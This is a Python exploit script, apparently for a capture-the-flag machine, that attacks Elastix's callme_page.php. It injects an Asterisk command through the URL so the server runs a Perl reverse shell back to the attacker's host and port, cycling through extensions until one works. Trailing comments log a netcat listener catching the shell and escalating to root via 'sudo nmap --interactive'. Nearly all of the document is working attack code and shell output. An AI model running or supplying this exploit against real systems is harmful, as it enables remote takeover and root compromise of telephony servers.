import requests
from pwn import *
import ssl
import urllib.request

def elastix(rhost, lhost, lport):

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    print("\n")
    log.progress("Kindly wait for sometime the script is checking with multiple extensions to dial and get the reverse connection\n")

    try:
        extension = ""
        for i in range(1,300):
            #print(i)
            url = 'https://' + str(rhost) +'/recordings/misc/callme_page.php?action=c&callmenum='+ str(i) + '@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22' + str(lhost) +'%3a' + str(lport) +'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
            web = urllib.request.urlopen(url, context=ctx, timeout=10)
            html = web.read().decode()
            #print(html)
            if "The call failed" not in html:
                extension += str(i)
                break
            else:
                print("Extension " + str(i) + " is not working so trying with next extension")
        if extension != "":
            print("\nThe correct extension for this one is " + str(extension) + " You must have received the reverse shell in netcat")
        else:
            print("Seems like the extension provided is not working, try changing the extension to next level, Check the readme page")

    except socket.timeout:
        print("The target is dead")
        
if __name__ == '__main__':
    rhost = input("Enter the ip address of target machine: ").strip()
    lhost = input("Enter the ip address of your machine: ").strip()
    lport = input("Enter the netcat listening port: ").strip()
    print("\nMake sure you have netcat listening on the other side\n")

    print("\n ***IF YOU GET ANY ERROR CHECK THE Errors.txt PAGE FOR FURTHER INSTRUCTIONS***\n")
    print("\n ***BEFORE RUNNING THE SCRIPT MAKE SURE YOU HAVE NETCAT LISTENING***\n")
    elastix(rhost, lhost, lport)

#nc -nlvp 9001
#Listening on 0.0.0.0 9001
#Connection received on 10.10.10.7 34069
#id
#uid=100(asterisk) gid=101(asterisk)
#sudo nmap --interactive                               

#Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
#Welcome to Interactive Mode -- press h <enter> for help
#nmap> !sh
#id
#uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
